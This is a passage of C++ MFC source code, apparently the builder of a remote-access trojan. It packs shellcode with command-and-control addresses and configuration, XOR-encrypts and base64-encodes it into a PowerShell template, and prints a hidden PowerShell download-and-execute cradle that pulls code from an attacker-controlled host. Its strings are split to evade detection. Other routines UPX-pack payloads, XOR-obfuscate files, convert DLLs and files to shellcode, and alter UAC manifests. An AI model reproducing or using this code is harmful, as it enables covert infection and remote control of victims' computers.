	//for (size_t i = 0; i < (sizeof(ShellCodeInfo) - 32); i++)
	//{
	//	((PBYTE)&m_ShellCodeInfo)[i + 32] ^= 'b';
	//}

	//读取文件
	unsigned char* encodeshellcode32 = NULL;;;
	if (path_data32.GetLength() > 0)
	{
		HANDLE hFile = CreateFile(path_data32, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("shellcode生成失败\r\n"));
			return FALSE;
		}
		DWORD len = GetFileSize(hFile, NULL);
		char* str = new char[len];
		ZeroMemory(str, sizeof(str));
		DWORD wr = 0;
		ReadFile(hFile, str, len, &wr, NULL);
		CloseHandle(hFile);

		//组合配置数据
		int shellcodesize = len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1 + m_ShellCodeInfo.addrlen2 + lstrlen(confi) * 2 + 2;
		unsigned char* lpDatBuffer = new unsigned char[shellcodesize];
		ZeroMemory(lpDatBuffer, shellcodesize);
		CopyMemory(lpDatBuffer, str, len);
		CopyMemory(lpDatBuffer + len, (LPCVOID)&m_ShellCodeInfo, sizeof(ShellCodeInfo));
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo), addr1, m_ShellCodeInfo.addrlen1 );
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1, addr2, m_ShellCodeInfo.addrlen2 );
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1 + m_ShellCodeInfo.addrlen2, confi, lstrlen(confi) * 2 + 2);

		SAFE_DELETE_AR(str);


		//简单加密shellcode
		for (int i = 0; i < shellcodesize; i++)
		{
			lpDatBuffer[i] ^= 88;
		}
		//shellcode 编码
		encodeshellcode32 = base64_encode(lpDatBuffer, shellcodesize);
		SAFE_DELETE_AR(lpDatBuffer);

	}

	unsigned char* encodeshellcode64 = NULL;;
	if (path_data64.GetLength() > 0)
	{
		HANDLE hFile = CreateFile(path_data64, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("shellcode生成失败\r\n"));
			return FALSE;
		}
		DWORD len = GetFileSize(hFile, NULL);
		char* str = new char[len];
		ZeroMemory(str, sizeof(str));
		DWORD wr = 0;
		ReadFile(hFile, str, len, &wr, NULL);
		CloseHandle(hFile);

		//组合配置数据
		int shellcodesize = len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1 + m_ShellCodeInfo.addrlen2 + lstrlen(confi) * 2 + 2;
		unsigned char* lpDatBuffer = new unsigned char[shellcodesize];
		ZeroMemory(lpDatBuffer, shellcodesize);
		CopyMemory(lpDatBuffer, str, len);
		CopyMemory(lpDatBuffer + len, (LPCVOID)&m_ShellCodeInfo, sizeof(ShellCodeInfo));
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo), addr1, m_ShellCodeInfo.addrlen1 );
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1, addr2, m_ShellCodeInfo.addrlen2 );
		CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1 + m_ShellCodeInfo.addrlen2, confi, lstrlen(confi) * 2 + 2);
		SAFE_DELETE_AR(str);

		//简单加密shellcode
		for (int i = 0; i < shellcodesize; i++)
		{
			lpDatBuffer[i] ^= 88;
		}
		//shellcode 编码
		encodeshellcode64 = base64_encode(lpDatBuffer, shellcodesize);
		SAFE_DELETE_AR(lpDatBuffer);

	}

	//拼接shellcode

	code = scriptall;
	code.Replace("替换数据X86", (char*)encodeshellcode32);
	code.Replace("替换数据X64", (char*)encodeshellcode64);
	SAFE_DELETE_AR(encodeshellcode32);
	SAFE_DELETE_AR(encodeshellcode64);
	//for (size_t i = 0; i < (sizeof(ShellCodeInfo) - 32); i++)
	//{
	//	((PBYTE)&m_ShellCodeInfo)[i + 32] ^= 'b';
	//}
	//二次加密

	if (powershellLogin)  	SAFE_DELETE_AR(powershellLogin);
	powershellLogin = base64_encode((unsigned char*)code.GetBuffer(), code.GetLength());
	code.Format("%s -nop -w hi%sen -c \"%sdownloa%s//%s:%d/index.php'))\"", "powershell.exe", "dd", "IEX((new-object net.webclient).", "dstring('http:", addr1, m_ShellCodeInfo.szPort1);
	CString codew;
	codew = _T("\r\n");
	codew = code;
	codew += _T("\r\n");
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)codew.GetBuffer());
	return TRUE;
}

BOOL CBuildDlg::SetComd(char* buff, DWORD size)
{
	BOOL  result = FALSE;
	HGLOBAL hmem = NULL;
	if (OpenClipboard()) //是否成功打开剪帖板
	{
		if (EmptyClipboard())//清空成功，则继续
		{
			hmem = GlobalAlloc(GHND, size);//memalloc strlen+1 \0
			char* pmem = (char*)GlobalLock(hmem);
			memcpy(pmem, buff, size);
			SetClipboardData(CF_TEXT, hmem);
			GlobalUnlock(hmem);
			result = TRUE;
		}
		//关闭剪贴板
		CloseClipboard();
	}
	return result;
}


//base64加密
unsigned char* CBuildDlg::base64_encode(unsigned char* str, DWORD str_len)
{
	long len;
	unsigned char* res;
	int i, j;
	//定义base64编码表  
	unsigned char* base64_table = (unsigned char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	//计算经过base64编码后的字符串长度  
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (unsigned char*)malloc(sizeof(unsigned char) * len + 1);
	res = new unsigned char[len + 1];
	res[len] = '\0';
	//以3个8位字符为一组进行编码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
	}
	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	return res;
}


unsigned char* CBuildDlg::base64_decode(unsigned char* code)
{
	//根据base64表，以字符找到对应的十进制数据  
	int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,62,0,0,0,
			 63,52,53,54,55,56,57,58,
			 59,60,61,0,0,0,0,0,0,0,0,
			 1,2,3,4,5,6,7,8,9,10,11,12,
			 13,14,15,16,17,18,19,20,21,
			 22,23,24,25,0,0,0,0,0,0,26,
			 27,28,29,30,31,32,33,34,35,
			 36,37,38,39,40,41,42,43,44,
			 45,46,47,48,49,50,51
	};
	long len;
	long str_len;
	unsigned char* res;
	int i, j;
	//计算解码后的字符串长度  
	len = strlen((char*)code);
	//判断编码后的字符串后是否有=  
	if (strstr((char*)code, "=="))
		str_len = len / 4 * 3 - 2;
	else if (strstr((char*)code, "="))
		str_len = len / 4 * 3 - 1;
	else
		str_len = len / 4 * 3;
	res = (unsigned char*)malloc(sizeof(unsigned char) * str_len + 1);
	res[str_len] = '\0';
	//以4个字符为一位进行解码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[j] = ((unsigned char)table[code[i]]) << 2 | (((unsigned char)table[code[i + 1]]) >> 4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
		res[j + 1] = (((unsigned char)table[code[i + 1]]) << 4) | (((unsigned char)table[code[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
		res[j + 2] = (((unsigned char)table[code[i + 2]]) << 6) | ((unsigned char)table[code[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
	}
	return res;
}


void CBuildDlg::upx(TCHAR* filePath)
{
	TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString path_upx, C_path_file;
	path_upx = DatPath;
	path_upx += _T("\\Plugins\\x86\\upx.exe");
	WIN32_FIND_DATA FindData;
	HANDLE hFile;
	hFile = FindFirstFile(path_upx, &FindData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		writerresour(IDR_UPX, _T("UPX"), path_upx);
	}
	hFile = FindFirstFile(path_upx, &FindData);
	if (hFile == INVALID_HANDLE_VALUE) { m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("UPX.EXE写出错误 或者 不存在无法压缩并且生成\r\n")); return; }

	if (path_upx.Find(_T(' ')) != -1)
	{
		path_upx.Insert(0, _T("\"\""));
		path_upx += _T("\"");
	}

	C_path_file = filePath;
	if (C_path_file.Find(_T(' ')) != -1)
	{
		C_path_file.Insert(0, _T("\""));
		C_path_file += _T("\"\"");
	}
	path_upx += _T(" ");
	path_upx += C_path_file;

	int m_cmdlen = WideCharToMultiByte(CP_ACP, 0, path_upx, -1, NULL, 0, NULL, NULL);
	char* c_cmd = new char[m_cmdlen + 1];
	WideCharToMultiByte(CP_ACP, 0, path_upx, -1, c_cmd, m_cmdlen, NULL, NULL);
	system(c_cmd);
	SAFE_DELETE_AR(c_cmd);
}




void CBuildDlg::encrypt(TCHAR* filePath)
{
	CInputDialog	dlg;
	dlg.Init(_T("异或加密"), _T("请输入密码:"), this);
	if (dlg.DoModal() != IDOK)return;
	CString fileout = filePath;
	fileout += _T("加密");
	HANDLE	hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件错误\r\n"));
		return;
	}
	DWORD	len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	DWORD wr = 0;
	ReadFile(hFile, str, len, &wr, NULL);
	CloseHandle(hFile);
	DeleteFile(fileout);

	for (int i = 0, j = 0; i < (int)len; i++)   //加密
	{
		((char*)str)[i] ^= (dlg.m_str.GetBuffer()[j++]) % 1753 + 79;

		if (i % (dlg.m_str.GetLength()) == 0)
			j = 0;
	}

	//写出配置好的文件
	CFile file;
	if (file.Open(fileout, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
	{
		file.Write(str, len);
		file.Close();
		SAFE_DELETE_AR(str);
	}
	else
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写出加密文件失败 .h\r\n"));
		SAFE_DELETE_AR(str);
		return;
	}

	//写出解密代码txt
	TCHAR szFilePath_txt[MAX_PATH] = { 0 };
	swprintf_s(szFilePath_txt, _T("%s%s"), fileout.GetBuffer(), _T("-解密代码.txt"));
	CStringA c_MyFileTabLe = OutData_xor;
	c_MyFileTabLe += '\0';
	CStringA xordate;
	xordate = dlg.m_str;
	c_MyFileTabLe.Replace("xordate", xordate);
	bool Result = false;
	DWORD  dwBytesWritten;
	hFile = CreateFile(szFilePath_txt, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		Result = false;
		return;
	}
	if (WriteFile(hFile, c_MyFileTabLe.GetBuffer(), c_MyFileTabLe.GetLength(), &dwBytesWritten, NULL)) Result = true;
	CloseHandle(hFile);
}



void CBuildDlg::change(TCHAR* filePath)
{
	CString fileout = filePath;
	fileout += _T(".h");
	HANDLE	hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件错误\r\n"));
		return;
	}
	DWORD	len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	DWORD wr = 0;
	ReadFile(hFile, str, len, &wr, NULL);
	CloseHandle(hFile);

	LPVOID	pOutBuff = VirtualAlloc(NULL, (len * 5 - 1) + ((len + 32 - 1) / 32 * 2) + 500, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pOutBuff == NULL)
	{
		VirtualFree(str, 0, MEM_RELEASE);
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("VirtualAlloc失败\r\n"));
		return;
	}

	char* pDllChar = (char*)str;
	char* pOutChar = (char*)pOutBuff;
	for (DWORD i = 0; i < len; i++)
	{
		if (i == len - 1)
		{
			sprintf_s(pOutChar, 4 * 2, "0x%0.2X", (unsigned char)*pDllChar++);

			pOutChar += 4;
		}
		else
		{
			sprintf_s(pOutChar, 4 * 2, "0x%0.2X,", (unsigned char)*pDllChar++);
			pOutChar += 5;
		}

		if (i % 32 == 31 || i == len - 1)
		{
			*pOutChar++ = '\r';
			*pOutChar++ = '\n';
		}
	}
	VirtualFree(str, 0, MEM_RELEASE);
	char OutData2[] = "#pragma once\r\n#include <windows.h>\r\n\r\n";
	char OutData3[64] = { 0 };
	sprintf_s(OutData3, 64, "const int g_ShellCodeFileSize = %d;\r\n", len);
	char OutData4[] = "unsigned char g_ShellCodeFileBuff[g_ShellCodeFileSize] = {\r\n";
	char OutData5[] = "};\r\n\r\n";

	HANDLE	hOutFile = CreateFile(fileout, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, 0, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("CreateFile失败\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		return;
	}

	DWORD BytesWritten = 0;
	if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &BytesWritten, NULL))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("WriteFile失败1\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		CloseHandle(hOutFile);
		return;
	}
	if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &BytesWritten, NULL))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("WriteFile失败2\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		CloseHandle(hOutFile);
		return;
	}
	if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &BytesWritten, NULL))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("WriteFile失败3\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		CloseHandle(hOutFile);
		return;
	}
	if (!WriteFile(hOutFile, pOutBuff, (len * 5 - 1) + ((len + 32 - 1) / 32 * 2), &BytesWritten, NULL))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("WriteFile失败4\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		CloseHandle(hOutFile);
		return;
	}
	if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &BytesWritten, NULL))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("WriteFile失败5\r\n"));
		VirtualFree(pOutBuff, 0, MEM_RELEASE);
		CloseHandle(hOutFile);
		return;
	}

	VirtualFree(pOutBuff, 0, MEM_RELEASE);
	CloseHandle(hOutFile);

	return;
}

void CBuildDlg::addordeluac(TCHAR* filePath)
{

	unsigned char adduacbuffer[] = {
	0x3C,0x3F,0x78,0x6D,0x6C,0x20,0x76,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3D,0x22,0x31,0x2E,0x30,0x22,0x20,0x65,0x6E,0x63,0x6F,0x64,0x69,0x6E,0x67,0x3D,0x22,0x75,0x74,
	0x66,0x2D,0x38,0x22,0x3F,0x3E,0x0D,0x0A,0x3C,0x61,0x73,0x6D,0x76,0x31,0x3A,0x61,0x73,0x73,0x65,0x6D,0x62,0x6C,0x79,0x20,0x6D,0x61,0x6E,0x69,0x66,0x65,0x73,0x74,
	0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3D,0x22,0x31,0x2E,0x30,0x22,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,0x6D,0x61,0x73,
	0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x31,0x22,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3A,0x61,0x73,0x6D,
	0x76,0x31,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,0x6D,0x61,0x73,0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,0x6F,0x6D,0x3A,0x61,0x73,
	0x6D,0x2E,0x76,0x31,0x22,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3A,0x61,0x73,0x6D,0x76,0x32,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,0x6D,0x61,0x73,0x2D,0x6D,
	0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x32,0x22,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3A,0x78,0x73,0x69,0x3D,0x22,
	0x22,0x3E,0x0D,0x0A,0x3C,0x61,0x73,0x73,0x65,0x6D,0x62,0x6C,0x79,0x49,0x64,0x65,0x6E,0x74,0x69,0x74,0x79,0x20,0x76,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3D,0x22,0x31,
	0x2E,0x30,0x2E,0x30,0x2E,0x30,0x22,0x20,0x6E,0x61,0x6D,0x65,0x3D,0x22,0x2E,0x61,0x64,0x64,0x22,0x2F,0x3E,0x0D,0x0A,0x3C,0x74,0x72,0x75,0x73,0x74,0x49,0x6E,0x66,
	0x6F,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,0x6D,0x61,0x73,0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,
	0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x32,0x22,0x3E,0x0D,0x0A,0x20,0x20,0x3C,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x3C,0x72,
	0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x50,0x72,0x69,0x76,0x69,0x6C,0x65,0x67,0x65,0x73,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,
	0x68,0x65,0x6D,0x61,0x73,0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x33,0x22,0x3E,0x0D,0x0A,0x20,0x20,
	0x20,0x20,0x3C,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x45,0x78,0x65,0x63,0x75,0x74,0x69,0x6F,0x6E,0x4C,0x65,0x76,0x65,0x6C,0x20,0x6C,0x65,0x76,0x65,0x6C,
	0x3D,0x22,0x72,0x65,0x71,0x75,0x69,0x72,0x65,0x41,0x64,0x6D,0x69,0x6E,0x69,0x73,0x74,0x72,0x61,0x74,0x6F,0x72,0x22,0x20,0x75,0x69,0x41,0x63,0x63,0x65,0x73,0x73,
	0x3D,0x22,0x66,0x61,0x6C,0x73,0x65,0x22,0x20,0x2F,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x3C,0x2F,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x50,0x72,0x69,0x76,0x69,
	0x6C,0x65,0x67,0x65,0x73,0x3E,0x0D,0x0A,0x20,0x20,0x3C,0x2F,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3E,0x0D,0x0A,0x3C,0x2F,0x74,0x72,0x75,0x73,0x74,0x49,0x6E,
	0x66,0x6F,0x3E,0x0D,0x0A,0x3C,0x2F,0x61,0x73,0x6D,0x76,0x31,0x3A,0x61,0x73,0x73,0x65,0x6D,0x62,0x6C,0x79,0x3E,
	};

	unsigned char deluacbuffer[] = {
	0x3C,0x3F,0x78,0x6D,0x6C,0x20,0x76,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3D,0x27,0x31,0x2E,0x30,0x27,0x20,0x65,0x6E,0x63,0x6F,0x64,0x69,0x6E,0x67,0x3D,0x27,0x55,0x54,
	0x46,0x2D,0x38,0x27,0x20,0x73,0x74,0x61,0x6E,0x64,0x61,0x6C,0x6F,0x6E,0x65,0x3D,0x27,0x79,0x65,0x73,0x27,0x3F,0x3E,0x0D,0x0A,0x3C,0x61,0x73,0x73,0x65,0x6D,0x62,
	0x6C,0x79,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3D,0x27,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,0x6D,0x61,0x73,0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,
	0x63,0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x31,0x27,0x20,0x6D,0x61,0x6E,0x69,0x66,0x65,0x73,0x74,0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3D,0x27,0x31,0x2E,0x30,
	0x27,0x3E,0x0D,0x0A,0x20,0x20,0x3C,0x74,0x72,0x75,0x73,0x74,0x49,0x6E,0x66,0x6F,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3D,0x22,0x75,0x72,0x6E,0x3A,0x73,0x63,0x68,0x65,
	0x6D,0x61,0x73,0x2D,0x6D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x2D,0x63,0x6F,0x6D,0x3A,0x61,0x73,0x6D,0x2E,0x76,0x33,0x22,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x20,
	0x3C,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x3C,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x50,0x72,0x69,0x76,
	0x69,0x6C,0x65,0x67,0x65,0x73,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x3C,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x45,0x78,0x65,0x63,0x75,
	0x74,0x69,0x6F,0x6E,0x4C,0x65,0x76,0x65,0x6C,0x20,0x6C,0x65,0x76,0x65,0x6C,0x3D,0x27,0x61,0x73,0x49,0x6E,0x76,0x6F,0x6B,0x65,0x72,0x27,0x20,0x75,0x69,0x41,0x63,
	0x63,0x65,0x73,0x73,0x3D,0x27,0x66,0x61,0x6C,0x73,0x65,0x27,0x20,0x2F,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x3C,0x2F,0x72,0x65,0x71,0x75,0x65,0x73,0x74,
	0x65,0x64,0x50,0x72,0x69,0x76,0x69,0x6C,0x65,0x67,0x65,0x73,0x3E,0x0D,0x0A,0x20,0x20,0x20,0x20,0x3C,0x2F,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3E,0x0D,0x0A,
	0x20,0x20,0x3C,0x2F,0x74,0x72,0x75,0x73,0x74,0x49,0x6E,0x66,0x6F,0x3E,0x0D,0x0A,0x3C,0x2F,0x61,0x73,0x73,0x65,0x6D,0x62,0x6C,0x79,0x3E,0x0D,0x0A,
	};

	BOOL result;
	result = (MessageBox(_T("确认添加UAC  取消删除UAC "), _T("添加删除UAC"), MB_OKCANCEL) == IDOK);
	HANDLE hUpdate = BeginUpdateResource(filePath, NULL);
	HMODULE  hModule = GetModuleHandle(filePath);
	if (FindResource(hModule, MAKEINTRESOURCE(1), MAKEINTRESOURCE(24)) != 0)
	{
		UpdateResource(hUpdate, MAKEINTRESOURCE(24), MAKEINTRESOURCE(1), 0, 0, 0);

	}
	UpdateResource(hUpdate, MAKEINTRESOURCE(24), MAKEINTRESOURCE(1), 1033, result ? adduacbuffer : deluacbuffer, result ? sizeof(adduacbuffer) : sizeof(deluacbuffer));
	BOOL ret = EndUpdateResource(hUpdate, FALSE);

	if (!ret)
	{
		hUpdate = BeginUpdateResource(filePath, FALSE);
		UpdateResource(hUpdate, MAKEINTRESOURCE(24), MAKEINTRESOURCE(1), 1033, result ? adduacbuffer : deluacbuffer, result ? sizeof(adduacbuffer) : sizeof(deluacbuffer));
		EndUpdateResource(hUpdate, FALSE);
	}

	CloseHandle(hModule);
}

void CBuildDlg::dll2shellcode(TCHAR* filePath)
{
	CStringA in_file;
	in_file = filePath;
	CStringA out_fileA(in_file);
	out_fileA += ".bin";
	dll_to_shellcode(0, "0", in_file, out_fileA);
}



void CBuildDlg::writerresour(int lpszType, LPCTSTR RName, LPCTSTR lpszName) //写出资源文件
{
	// 查找所需的资源
	HRSRC   hResInfo = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(lpszType), RName);
	if (hResInfo == NULL) return;
	// 获得资源尺寸
	DWORD dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL) return;

	LPBYTE p_date = new BYTE[dwSize];
	if (p_date == NULL)     return;
	// 复制资源数据
	CopyMemory((LPVOID)p_date, (LPCVOID)LockResource(hResData), dwSize);

	HANDLE hFile = CreateFile(lpszName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL) {
		DWORD  dwWritten;
		WriteFile(hFile, (LPVOID)p_date, dwSize, &dwWritten, NULL);
		CloseHandle(hFile);
	}
	SAFE_DELETE_AR(p_date);

}







